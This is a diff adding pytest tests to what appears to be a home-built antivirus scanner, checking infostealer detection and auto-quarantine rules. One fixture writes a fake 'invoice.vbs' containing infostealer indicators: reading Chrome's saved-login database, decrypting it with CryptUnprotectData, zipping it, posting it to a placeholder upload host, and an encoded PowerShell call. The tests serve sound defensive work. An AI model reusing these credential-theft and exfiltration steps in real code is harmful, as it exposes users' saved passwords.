@@ -84,3 +84,40 @@ def test_analyze_script_detects_browser_credentials_decryption_and_exfiltration(
     assert result.score >= 80
     assert any("браузера" in reason.lower() for reason in result.reasons)
     assert any("отправки данных" in reason.lower() for reason in result.reasons)
+
+
+def test_analyze_file_flags_known_infostealer_executable_name(tmp_path):
+    sample = tmp_path / "vidar.exe"
+    sample.write_bytes(b"not-a-real-pe-file")
+
+    result = analyze_file(sample)
+
+    assert result.score >= 50
+    assert any("infostealer" in reason.lower() for reason in result.reasons)
+
+
+def test_auto_quarantine_allows_only_high_confidence_user_script(tmp_path):
+    from src.antivir.core import should_auto_quarantine
+
+    script = tmp_path / "Downloads" / "invoice.vbs"
+    script.parent.mkdir()
+    script.write_text(
+        'sqlite3.connect("Chrome\\\\User Data\\\\Default\\\\Login Data") '
+        'CryptUnprotectData(key) zipfile.ZipFile(data) '
+        'requests.post("https://example.invalid/upload") '
+        'powershell -enc abc',
+        encoding="utf-8",
+    )
+    result = analyze_file(script)
+
+    assert result.score >= 90
+    assert should_auto_quarantine(result) is True
+
+
+def test_auto_quarantine_does_not_apply_to_low_confidence_or_executable_files(tmp_path):
+    from src.antivir.core import ScanResult, should_auto_quarantine
+
+    low = ScanResult(tmp_path / "Downloads" / "readme.ps1", "0" * 64, 75, ["weak signal"])
+    executable = ScanResult(tmp_path / "Downloads" / "suspicious.exe", "0" * 64, 100, ["score"])
+    assert should_auto_quarantine(low) is False
+    assert should_auto_quarantine(executable) is False
